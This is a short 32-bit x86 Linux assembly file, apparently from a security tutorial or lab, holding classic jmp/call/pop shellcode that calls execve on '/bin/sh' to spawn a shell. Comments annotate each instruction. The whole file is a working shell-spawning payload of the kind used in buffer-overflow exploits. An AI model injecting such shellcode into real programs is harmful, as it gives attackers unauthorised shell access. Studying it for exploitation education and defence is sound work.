section .text
  global _start
    _start:
			BITS 32
			jmp short two
		one:
			pop ebx 					; [1]
			xor eax, eax
			mov [ebx+7], al		; save 0x00 (1 byte) to memory at address ebx+7
			mov [ebx+8], ebx 	; save ebx (4 bytes) to memory at address ebx+8
			mov [ebx+12], eax	; save eax (4 bytes) to memory at address ebx+12
			lea ecx, [ebx+8] 	; let ecx = ebx + 8
			xor edx, edx
			
			mov al,  0x0b     ; usual stuff
			int 0x80
		two:
			call one
			db '/bin/sh*AAAABBBB'  ; [2]
